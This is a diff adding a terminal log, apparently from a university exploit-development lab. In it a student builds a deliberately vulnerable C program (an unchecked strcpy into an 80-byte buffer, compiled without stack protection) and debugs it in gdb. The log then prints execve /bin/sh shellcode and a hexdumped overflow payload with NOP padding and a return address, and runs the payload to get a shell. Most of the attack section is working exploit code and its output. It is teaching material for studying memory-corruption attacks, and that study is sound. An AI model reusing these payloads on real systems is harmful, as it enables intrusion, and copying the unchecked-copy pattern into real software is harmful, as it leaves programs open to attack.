@@ -1,0 +1,141 @@
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat victim_bss.c
+#include <string.h>
+#include <stdio.h>
+
+char globalbuff[80];
+
+int main(int argc, char** argv)
+{
+  char localbuff[80];
+  
+  strcpy(localbuff, argv[1]);
+  
+  // copy the localbuff to the global buff
+  strcpy(globalbuff, localbuff);
+ 
+  printf("Address of globalbuff:%p\n", globalbuff); 
+  return 0; 
+}
+
+
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc victim_bss.c -o victim_bss -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_bss ENPM
+Address of globalbuff:0x804a040
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_bss ENPM
+Address of globalbuff:0x804a040
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_bss ENPM
+Address of globalbuff:0x804a040
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb victim_bss -q
+Reading symbols from victim_bss...done.
+(gdb) info functions
+All defined functions:
+
+File victim_bss.c:
+int main(int, char **);
+
+Non-debugging symbols:
+0x080482cc  _init
+0x08048300  printf@plt
+0x08048310  strcpy@plt
+0x08048320  __libc_start_main@plt
+0x08048340  _start
+0x08048370  __x86.get_pc_thunk.bx
+0x08048380  deregister_tm_clones
+0x080483b0  register_tm_clones
+0x080483f0  __do_global_dtors_aux
+0x08048410  frame_dummy
+0x08048480  __libc_csu_init
+0x080484e0  __libc_csu_fini
+0x080484e4  _fini
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0804843b <+0>:	push   %ebp
+   0x0804843c <+1>:	mov    %esp,%ebp
+   0x0804843e <+3>:	sub    $0x50,%esp
+   0x08048441 <+6>:	mov    0xc(%ebp),%eax
+   0x08048444 <+9>:	add    $0x4,%eax
+   0x08048447 <+12>:	mov    (%eax),%eax
+   0x08048449 <+14>:	push   %eax
+   0x0804844a <+15>:	lea    -0x50(%ebp),%eax
+   0x0804844d <+18>:	push   %eax
+   0x0804844e <+19>:	call   0x8048310 <strcpy@plt>
+   0x08048453 <+24>:	add    $0x8,%esp
+   0x08048456 <+27>:	lea    -0x50(%ebp),%eax
+   0x08048459 <+30>:	push   %eax
+   0x0804845a <+31>:	push   $0x804a040
+   0x0804845f <+36>:	call   0x8048310 <strcpy@plt>
+   0x08048464 <+41>:	add    $0x8,%esp
+   0x08048467 <+44>:	push   $0x804a040
+   0x0804846c <+49>:	push   $0x8048500
+   0x08048471 <+54>:	call   0x8048300 <printf@plt>
+   0x08048476 <+59>:	add    $0x8,%esp
+   0x08048479 <+62>:	mov    $0x0,%eax
+   0x0804847e <+67>:	leave  
+   0x0804847f <+68>:	ret    
+End of assembler dump.
+(gdb) list 1
+1	#include <string.h>
+2	#include <stdio.h>
+3	
+4	char globalbuff[80];
+5	
+6	int main(int argc, char** argv)
+7	{
+8	  char localbuff[80];
+9	  
+10	  strcpy(localbuff, argv[1]);
+(gdb) 
+11	  
+12	  // copy the localbuff to the global buff
+13	  strcpy(globalbuff, localbuff);
+14	 
+15	  printf("Address of globalbuff:%p\n", globalbuff); 
+16	  return 0; 
+17	}
+18	
+19	
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ nano victim_jmpbss.py
+Use "fg" to return to nano.
+
+[1]+  Stopped                 nano victim_jmpbss.py
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat shellcode.txt
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ python victim_jmpbss.py
+  File "victim_jmpbss.py", line 1
+    payload = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+                                                                                                              ^
+SyntaxError: EOL while scanning string literal
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ python victim_jmpbss.py
+ValueError: invalid \x escape
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ python victim_jmpbss.py
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ hexdump -C payload_jmpbss
+00000000  31 c0 50 68 6e 2f 73 68  68 2f 2f 62 69 89 e3 99  |1.Phn/shh//bi...|
+00000010  52 53 89 e1 b0 0b cd 80  90 90 90 90 90 90 90 90  |RS..............|
+00000020  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+*
+00000050  90 90 90 90 40 a0 04 08                           |....@...|
+00000058
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_bss $(cat payload_jmpbss)
+Address of globalbuff:0x804a040
+$ whoami
+user
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ exit 
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_bss $(cat payload_jmpbss)
+Address of globalbuff:0x804a040
+$ whoami
+user
+$ is
+//bin/sh: 2: is: not found
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ quit
+//bin/sh: 4: quit: not found
+$ exit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc victim_bss.c -o victim_bss -mpreferred-stack-boundary=2 -zexecstack -g
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./victim_bss $(cat payload_jmpbss)
+Address of globalbuff:0x804a060
+*** stack smashing detected ***: ./victim_bss terminated
+Aborted (core dumped)
